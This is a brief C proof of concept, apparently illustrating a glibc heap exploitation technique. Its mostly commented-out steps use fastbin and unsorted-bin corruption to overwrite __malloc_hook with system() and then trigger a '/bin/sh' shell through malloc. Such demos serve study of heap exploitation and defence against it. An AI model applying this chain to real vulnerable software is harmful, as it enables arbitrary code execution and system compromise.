#define _GNU_SOURCE     /* for RTLD_NEXT */
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <malloc.h>
#include <dlfcn.h>

int main(){
	uint8_t* fastbin_victim = malloc(0x60); 
	malloc(0x80);
	uint8_t* main_arena_use = malloc(0x80);
	uint8_t* relative_offset_heap = malloc(0x60);
	free(main_arena_use);
	uint8_t* fake_libc_chunk = malloc(0x60);
	//long long __malloc_hook = ((long*)fake_libc_chunk)[0] - 0xe8;
	//free(relative_offset_heap);
	//free(fastbin_victim);
	//fastbin_victim[0] = 0x00;
	//long long __malloc_hook_adjust = __malloc_hook - 0x23;
	//int8_t byte1 = (__malloc_hook_adjust) & 0xff; 	
	//int8_t byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
	//fake_libc_chunk[0] = byte1;
	//fake_libc_chunk[1] = byte2;
	//malloc(0x60);
	//malloc(0x60);
	//uint8_t* malloc_hook_chunk = malloc(0x60);
	//uint8_t* unsorted_bin_ptr = malloc(0x80);
	//malloc(0x30);
	//free(unsorted_bin_ptr);
	//__malloc_hook_adjust = __malloc_hook - 0x10;
	//byte1 = (__malloc_hook_adjust) & 0xff; 	
	//byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
	//unsorted_bin_ptr[8] = byte1;
	//unsorted_bin_ptr[9] = byte2;
	//malloc(0x80);
	//long long system_addr = (long long)dlsym(RTLD_NEXT, "system");
	//malloc_hook_chunk[19] = system_addr & 0xff;

	//malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;
	//malloc_hook_chunk[21] = (system_addr >> 16) & 0xff;
	//malloc_hook_chunk[22] = (system_addr >> 24) & 0xff;

	//malloc((long long)"/bin/sh\x00");
}
